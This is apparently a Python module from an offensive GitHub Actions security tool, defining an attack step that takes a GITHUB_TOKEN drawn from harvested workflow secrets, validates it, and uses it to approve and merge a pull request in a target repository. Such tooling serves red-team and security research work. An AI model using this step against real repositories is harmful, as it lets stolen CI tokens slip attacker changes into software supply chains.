from gatox.cli.output import Output
from gatox.attack.pwnrequest.steps.attack_step import AttackStep


class Merge(AttackStep):
    """Represents using a PAT or GITHUB_TOKEN with pull requests
    write and contents write to approve and merge pull request.
    """

    @AttackStep.require_params("secrets")
    def preflight(self, api, secrets=...):
        # Validate the GITHUB_TOKEN
        self.credential = secrets["values"]["system.github.token"]

        status = api.call_get(
            f"/installation/repositories", credential_override=self.credential
        )
        if status.status_code == 401:
            Output.error("Token invalid or expired!")
            return False

        # Validate that the PR exists

        return True

    def execute(self, api):
        """Execute the step after validating pre-conditions."""

        # Approve PR
        api.approve_pr(self.target_repo, self.pr_number, self.credential)

        api.merge_pr(self.target_repo, self.pr_number, self.credential)

        return True
